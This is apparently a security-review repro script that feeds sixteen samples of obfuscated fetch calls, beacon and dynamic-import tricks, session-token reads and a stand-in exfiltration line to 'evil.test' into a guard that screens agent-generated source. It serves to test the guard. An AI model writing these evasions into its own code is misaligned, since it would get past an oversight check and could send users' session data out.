// R2-M2: agent-server의 생성 소스 텍스트 검사(assertSourcePolicy) 우회 표본. 우회가 "실제 정책 우회"로 이어지는지는 01/02(브라우저)에서 판단.
// 실행(루트): node --import ./services/agent-server/node_modules/tsx/dist/loader.mjs docs/review/repro/r2/09-m2-source-guard.mts
import { assertSourcePolicy } from '../../../../services/agent-server/src/source-policy.ts';
const samples: [string, string][] = [
  ['literal fetch (차단 기대)', `fetch('/x')`],
  ['globalThis["fe"+"tch"]', `globalThis['fe'+'tch']('/x')`],
  ['const f = window.fetch; f()', `const f = window.fetch; f('/x')`],
  ['fetch.call', `fetch.call(null, '/x')`],
  ['Reflect.apply(fetch)', `Reflect.apply(fetch, null, ['/x'])`],
  ['fetch\\u0028 유니코드 이스케이프 식별자', `\\u0066etch('/x')`],
  ['protocol-relative //evil.test', `new Image().src = '//evil.test/?d=' + 1`],
  ['"http:" + "//" 조합', `const u = 'http:' + '//localhost:7200'`],
  ['"/dev/" + "session"', `const p = '/dev/' + 'session'`],
  ['atob로 URL 복원', `const p = atob('L2Rldi9zZXNzaW9u')`],
  ['__TOI_FETCH_CONFIG__ 읽기(허용)', `const c = globalThis.__TOI_FETCH_CONFIG__; console.log(c.sessionToken)`],
  ['Object.assign(globalThis.__TOI_FETCH_CONFIG__, …)', `Object.assign(globalThis.__TOI_FETCH_CONFIG__, { proxyBaseUrl: 'x' })`],
  ['<form> POST', `const f = document.createElement('form'); f.method='post'`],
  ['navigator["sendBeacon"]', `navigator['sendBeacon']('/x', 'y')`],
  ['import("data:…")', `import('data:text/javascript,' + code)`],
  ['/src/ 밖 파일 (/public/x.js)', `fetch('/x')`],
];
for (const [label, code] of samples) {
  const path = label.startsWith('/src/ 밖') ? '/public/x.js' : '/src/App.tsx';
  try { assertSourcePolicy({ [path]: code }); console.log('%s', label.padEnd(48), 'PASSES guard'); }
  catch (e) { console.log('%s', label.padEnd(48), 'blocked:', (e as Error).message.replace(/^.*?: /, '')); }
}
